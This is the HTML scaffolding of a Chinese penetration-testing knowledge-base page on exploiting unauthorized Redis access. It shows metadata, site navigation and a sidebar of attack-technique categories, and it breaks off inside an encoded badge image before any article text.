<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Redis未授权访问漏洞利用 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Redis未授权访问漏洞利用 | d4m1ts 知识库"><meta data-rh="true" name="description" content="d4m1ts2018 d4m1ts2019 d4m1ts_2020"><meta data-rh="true" property="og:description" content="d4m1ts2018 d4m1ts2019 d4m1ts_2020"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"渗透测试","item":"https://blog.gm7.org/docs/渗透测试/"},{"@type":"ListItem","position":2,"name":"WEB漏洞","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/"},{"@type":"ListItem","position":3,"name":"未授权访问","item":"https://blog.gm7.org/docs/category/未授权访问"},{"@type":"ListItem","position":4,"name":"Redis未授权访问漏洞利用","item":"https://blog.gm7.org/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.f7944275.css">
<script src="/assets/js/runtime~main.7a2f1031.js" defer="defer"></script>
<script src="/assets/js/main.d14e79f0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/渗透测试/">渗透测试</a><button aria-label="折叠侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/渗透测试/信息收集/资产收集/主域名收集/">信息收集</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/渗透测试/WEB漏洞/">WEB漏洞</a><button aria-label="折叠侧边栏分类 &#x27;WEB漏洞&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SQL注入/">SQL注入</a><button aria-label="展开侧边栏分类 &#x27;SQL注入&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSS/">XSS</a><button aria-label="展开侧边栏分类 &#x27;XSS&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/csrf">CSRF</a><button aria-label="展开侧边栏分类 &#x27;CSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSRF/">SSRF</a><button aria-label="展开侧边栏分类 &#x27;SSRF&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/未授权访问">未授权访问</a><button aria-label="折叠侧边栏分类 &#x27;未授权访问&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/未授权访问/未授权访问漏洞总结">未授权访问漏洞总结</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/渗透测试/WEB漏洞/未授权访问/Redis未授权访问漏洞利用">Redis未授权访问漏洞利用</a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/条件竞争/">条件竞争</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意文件下载:读取/">任意文件下载/读取</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件上传/">文件上传</a><button aria-label="展开侧边栏分类 &#x27;文件上传&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/文件包含漏洞/">文件包含漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/LDAP注入/">LDAP注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/命令执行/">命令执行</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/代码注入/">代码注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SAML测试/">SAML测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/JSONP数据劫持/">JSONP数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CORS跨域数据劫持/">CORS跨域数据劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CSV注入/">CSV注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSSI/">XSSI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XSLT/">XSLT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XS-Leaks/">XS-Leaks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SSTI注入/">SSTI</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/GraphQL测试/">GraphQL安全测试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/子域名接管/">子域名接管</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/列目录漏洞/">列目录漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/XPATH注入/">XPATH注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/越权漏洞/">越权漏洞</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/不安全的反序列化/">不安全的反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/任意URL跳转/">任意URL跳转</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/信息泄漏/">信息泄漏漏洞</a><button aria-label="展开侧边栏分类 &#x27;信息泄漏漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/SMTP注入/">SMTP注入</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/WEB漏洞/逻辑漏洞/">逻辑漏洞</a><button aria-label="展开侧边栏分类 &#x27;逻辑漏洞&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/CRLF注入/">CRLF注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/渗透测试/WEB漏洞/web缓存投毒/">WEB缓存投毒</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/思路技巧">思路技巧</a><button aria-label="展开侧边栏分类 &#x27;思路技巧&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/权限维持/">权限维持</a><button aria-label="展开侧边栏分类 &#x27;权限维持&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/小程序测试">小程序测试</a><button aria-label="展开侧边栏分类 &#x27;小程序测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/保护自己">保护自己</a><button aria-label="展开侧边栏分类 &#x27;保护自己&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/waf绕过">WAF绕过</a><button aria-label="展开侧边栏分类 &#x27;WAF绕过&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/攻防演练/">攻防演练</a><button aria-label="展开侧边栏分类 &#x27;攻防演练&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/渗透测试/社工钓鱼/">社工钓鱼</a><button aria-label="展开侧边栏分类 &#x27;社工钓鱼&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/cs">C2</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/powershell">免杀</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/docs/category/内网基础知识">内网渗透</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/基础知识扫盲">基础知识扫盲</a><button aria-label="展开侧边栏分类 &#x27;基础知识扫盲&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/代码审计/">代码审计</a><button aria-label="展开侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/"><span>渗透测试</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/渗透测试/WEB漏洞/"><span>WEB漏洞</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/未授权访问"><span>未授权访问</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Redis未授权访问漏洞利用</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Redis未授权访问漏洞利用</h1></header><p><img decoding="async" loading="lazy" alt="d4m1ts_2018" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByb2xlPSJpbWciIGFyaWEtbGFiZWw9ImQ0bTF0czogMjAxOCI+PHRpdGxlPmQ0bTF0czogMjAxODwvdGl0bGU+PGxpbmVhckdyYWRpZW50IGlkPSJzIiB4Mj0iMCIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2JiYiIgc3RvcC1vcGFjaXR5PSIuMSIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1vcGFjaXR5PSIuMSIvPjwvbGluZWFyR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJyIj48cmVjdCB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iI2ZmZiIvPjwvY2xpcFBhdGg+PGcgY2xpcC1wYXRoPSJ1cmwoI3IpIj48cmVjdCB3aWR0aD0iNjgiIGhlaWdodD0iMjAiIGZpbGw9IiNiZmJmYmYiLz48cmVjdCB4PSI2OCIgd2lkdGg9IjM3IiBoZWlnaHQ9IjIwIiBmaWxsPSIjZmY3NTFhIi8+PHJlY3Qgd2lkdGg9IjEwNSIgaGVpZ2h0PSIyMCIgZmlsbD0idXJsKCNzKSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMTAiPjxpbWFnZSB4PSI1IiB5PSIzIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHhsaW5rOmhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNJak0yTXpZek5rSWlCeWIyeGxQU0pwYldjaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkNBeU5DSWdlRzFzYm5NOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2YzNabklqNDhkR2wwYkdVK1JYUm9aWEpsZFcwOEwzUnBkR3hsUGp4d1lYUm9JR1E5SWsweE1TNDVORFFnTVRjdU9UZE1OQzQxT0NBeE15NDJNaUF4TVM0NU5ETWdNalJzTnk0ek55MHhNQzR6T0MwM0xqTTNNaUEwTGpNMW